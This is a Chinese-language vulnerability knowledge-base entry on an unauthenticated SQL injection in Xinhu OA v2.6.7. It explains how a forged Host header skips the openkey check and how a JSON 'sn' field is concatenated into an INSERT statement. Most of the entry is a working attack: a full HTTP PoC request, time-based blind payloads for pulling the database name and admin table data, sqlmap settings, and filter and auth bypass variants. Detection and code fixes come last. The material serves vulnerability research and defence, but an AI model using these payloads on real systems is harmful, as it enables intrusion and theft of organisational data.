---
id: web-generic-sqli-xinhu-opendkq-zktime-sn-insert
title: 信呼OA openapi opendkq zktime：Host 头伪造绕过 openkey 校验，JSON 的 sn 直拼 insert 形成前台 SQL 注入
type: scenario
domain: web
path: web/generic/sqli
technique: xinhu-opendkq-zktime-sn-insert-sqli
aliases:
- 信呼OA 前台 SQL 注入
- xinhu zktime SQLi
- opendkqAction zktimeAction
- addkqjs 注入
- kqjsn insert 注入
- Host 头绕过 openkey
- 中控考勤机接口注入
tags:
- sqli
- php
- xinhu
- oa
- unauth
- host-header
- time-based-blind
- insert
- code-audit
cve: []
severity: high
confidence: high
status: verified
affected_versions: 信呼OA v2.6.7
created: '2026-11-08'
updated: '2026-11-08'
verification:
  verified_by: verifier-T1-19
  verified_at: '2026-11-08T09:17:44+08:00'
  notes: 已对照原文核对：13 张图确认路由 m=opendkq|openapi&d=task&a=zktime、两层 JSON 的 sn 经 arrvalue 进 addkqjs→kqjsn insert、toaddval 只加引号不转义、父类 initAction 用 Host 头判内网即可绕过 openkey；img03 为 sleep(4)/5.68s、img04 sqlmap 确认 time-based blind 且取到库 rockxinhu267，PoC 可复现。受影响版本按原文标题标注取 信呼OA v2.6.7（原文未给修复版本），已去掉括号注释
---

## 一句话结论

信呼OA 2.6.7 的 `webmain/task/openapi/opendkqAction.php` 在处理中控考勤数据时，把 JSON body 里 `sn` 的值原样塞进 `kqjsn` 表的 `insert` 语句字段值（`toaddval()` 只加引号不转义），而父类 `openapiAction::initAction()` 的 openkey 校验用 **HTTP Host 头**判断“是否内网来源”——请求方只要把 `Host` 写成 `127.0.0.1` 或含 `192.168` 的串即可跳过校验，未登录即可对 `sn` 做时间盲注。

## 原理

- **路由**：`index.php?m=opendkq|openapi&d=task&a=zktime`。信呼把 `m` 拆成“文件名|目录名”，`d` 是最外层目录，最终加载 `webmain/task/openapi/openapiAction.php`（父类）与 `webmain/task/openapi/opendkqAction.php`（子类），并调用 `zktimeAction()`。
- **为什么开放**：`openapiAction::initAction()` 的校验条件是
  ```php
  if($this->keycheck && HOST != '127.0.0.1' && !contain(HOST,'192.168') && $this->openkey != ''){
      if($openkey != md5($this->openkey))$this->showreturn('', 'openkey not access', 201);
  }
  ```
  `HOST` 来自请求头 `Host`，不是 TCP 对端地址 `REMOTE_ADDR`。因此这是**头部字段判定**而非真实 IP 限制：攻击者在公网把 `Host: 127.0.0.1`（或 `Host: 192.168.1.1`）发过来，条件整体为假，openkey 校验被短路跳过，随后照常执行 `getpostdata()` 读取原始 body。
- **入参**：`zktimeAction()` 调用 `senddata(9)`；`senddata()` 先 `json_decode($this->postdata, true)` 得到数组，再 `foreach($arr as $k=>$rs)` 逐条处理——所以 body 必须是**两层 JSON**（外层键任意，如 `cn`；内层对象含 `sn`），才能让 `$rs` 是数组、`arrvalue($rs,'sn')` 取到值。
- **过滤错位**：`senddata()` 里只对 `$rs['name']` 做了 `str_replace("'",'', $name)`，而 `$sn` 直接来自 `arrvalue($rs,'sn')`，没有经过 `$rock->get()/post()` 的全局黑名单，也没有转义。随后 `$sn` 被当作 `num` 与 `name` 一起传给 `addkqjs($sn)`，名字层面的过滤对 `sn` 完全不生效。
- **Sink**：`addkqjs()` 组装 `$uarr = ['pinpai'=>'1','num'=>$sn,'name'=>$sn,'comid'=>'1','optdt'=>$this->now]`，调用 `m('kqjsn')->insert($uarr)` → `Model::insert()` → `mysqlClass::record()`，后者用
  ```php
  foreach($array as $key=>$val){ $cont.=",`$key`=".$this->toaddval($val); }
  $sql="insert into $table set $cont";
  ```
  `toaddval()` 只负责在值两端加单引号，不转义内部引号，于是拼出
  ```sql
  insert into `xinhu_kqjsn` set `pinpai`='1',`num`='123' and sleep(3)#',`name`='123' and sleep(3)#',...
  ```
  `'` 闭合字符串、`#` 注释掉尾部，`sleep()` 在 `insert` 执行期间被求值——`insert` 语句没有回显通道，所以表现为时间盲注。
- **为什么能读出数据**：MySQL 在 `insert ... set 字段='x' and <expr>'` 中会对表达式求值，因此 `and (select ...)`、`if(...,sleep(n),0)`、`or sleep(n)` 都可作为布尔/时间判定；sqlmap 用嵌套 `SELECT ... FROM (SELECT(SLEEP(5)))` 形式确认了 time-based blind，并识别后端为 MySQL、库名 `rockxinhu267`。
- **前置**：`$snarr = $this->db->getarr('[Q]kqjsn','`pinpai`=1',...)` 先按 `num` 从库中取已有设备号；只有 `$sn` **不在**该映射里才会走到 `addkqjs()`。带引号的 payload 天然不匹配任何已有 `num`，因此这个“先查缓存”的分支反而保证了注入路径被执行。

## 触发条件

- 目标为信呼OA 2.6.7（或存在相同 `opendkqAction::zktimeAction/senddata/addkqjs` 代码的版本），且 `webmain/task/openapi/` 路由可访问。
- 请求可自定义 `Host` 头（直连 IP/域名、或经过不重写 Host 的反代均可；若前置代理强制覆盖 Host 为真实域名且域名不含 `192.168`，绕过失败）。
- `getconfig('openkey')` 是否为空不影响结论：非空时被 Host 短路，为空时条件本身不成立。
- 后端为 MySQL，`SLEEP()`/`IF()` 可用；`kqjsn` 表可写（注入成功时会真实插入考勤机记录，属副作用）。
- 仅限授权测试；`sleep` 会阻塞 `insert`，避免高并发。

## 利用步骤

1. 定位：确认 `opendkqAction.php` 存在 `zktimeAction()` → `senddata(9)` → `addkqjs($sn)` → `m('kqjsn')->insert()` 调用链，且父类 `initAction()` 用 `HOST` 常量做来源判断。
2. 构造路由：`/index.php?m=opendkq|openapi&d=task&a=zktime`（`|` 可写成 `%7C`）。
3. 设置 `Host: 127.0.0.1`（或 `Host: 192.168.0.1`）绕过 openkey；`Content-Type` 用 `application/x-www-form-urlencoded` 或 `text/plain` 均可，只要 body 不被 PHP 解析进 `$_POST` 而是留在 `php://input` 被 `getpostdata()` 读到。
4. body 用两层 JSON：`{"cn":{"sn":"<payload>"}}`。
5. 先验证延时：`sn` 传 `123' and sleep(3)#`，与 `sn=123` 对比响应耗时；再用 `and if(ascii(substr((select database()),1,1))>100,sleep(2),0)#` 逐字符取库名/表名/管理员数据。
6. 也可交给 sqlmap：把请求存成文件，标 `*` 在 `sn` 值处，`--dbms=mysql --technique=T --level=3`。
7. 收尾：每次命中都会向 `kqjsn` 插入一行 `num/name` 为 payload 的记录，测试后清理。

## PoC

```http
POST /index.php?m=opendkq%7Copenapi&d=task&a=zktime HTTP/1.1
Host: 127.0.0.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 34

{"cn":{"sn":"123' and sleep(3)#"}}
```

时间盲注取值模板：

```text
{"cn":{"sn":"123' and if(ascii(substr((select database()),1,1))>64,sleep(2),0)#"}}
{"cn":{"sn":"123' and if((select count(*) from `admin`)>0,sleep(2),0)#"}}
```

说明：`Host` 必须是 `127.0.0.1` 或含 `192.168` 的串；body 必须是两层 JSON，外层键名任意。原文用 sqlmap 对该点确认了 `MySQL >= 5.0.12 AND time-based blind (query SLEEP)`，取到当前库 `rockxinhu267`；不同环境绝对耗时需重测。

## 变体与关联

- **同产品不同点**：[[web-generic-sqli-xinhu-kqjcmd-savefingerprint-openkqj-unauth]]（`openkqj|openapi` 的 `api&/post` 路由、`ccid` 进入 `where`）、[[web-generic-sqli-xinhu-setwxqy-base64-mobile-getone]]、[[web-generic-sqli-xinhu-base64-filter-bypass-admin-actions]]、[[web-generic-sqli-xinhu-getmfilv-fname-base64-insert]]。本条与之差异是**端点、参数、sink 全部不同**：`opendkq` 模块 `sn` → `kqjsn` 的 `insert` 字段值，且鉴权绕过靠 `Host` 头而非重写 `initAction`。
- **绕过变体**：`Host` 用 `127.0.0.1:8080`、`192.168.1.1`、`localhost` 之外还可试 `Host: 127.0.0.1` + 绝对 URI 行；若反代覆盖 Host，可尝试 `X-Forwarded-Host`（是否生效取决于 `HOST` 常量的取法）。
- **注入形态变体**：`and`/`or` 互换、`sleep()` 换 `benchmark()`、`if()` 换 `case when`；`#` 被过滤时用 `-- -` 或 `/*`；`insert` 字段值上下文也可用 `and extractvalue(1,concat(0x7e,(select ...)))` 走报错注入（需页面回显错误）。
- **同类审计点**：全局搜 `toaddval(`、`record($`、`->insert($`，重点看值是否来自 `php://input`/JSON 原文且未经 `intval`/转义；同时搜 `HOST !=`、`contain(HOST` 这类“用 Host 头当内网白名单”的判断。

## 检测与防御

- **检测**：`/index.php` 上 `m` 含 `|`、`d=task`、`a=zktime` 的请求，且 `Host` 头为 `127.0.0.1`/`localhost`/私网网段而实际来源为公网；JSON body 中 `sn` 含 `'`、`sleep(`、`if(`、`#`、`benchmark(`；`kqjsn` 表出现 `num`/`name` 含引号或 SQL 关键词的记录；慢请求耗时与 `sleep` 秒数吻合。
- **代码修复**：`addkqjs()` 的 `insert` 改为参数化/预处理；`toaddval()` 至少使用 `mysqli_real_escape_string` 或 `addslashes`，禁止“加引号即安全”；`sn` 按业务做 `[A-Za-z0-9_-]{1,64}` 白名单校验。
- **鉴权修复**：不要用 `Host` 头判断来源，改用 `$_SERVER['REMOTE_ADDR']` 或反向代理下受信的 `X-Forwarded-For`（配合代理白名单）；openapi 路由统一要求 openkey/签名，且校验失败直接终止而非仅提示。
- **加固**：`insert` 前先做 `is_numeric`/长度校验；关闭详细错误回显；对中控设备接口限制来源网段并在网关层做 ACL。
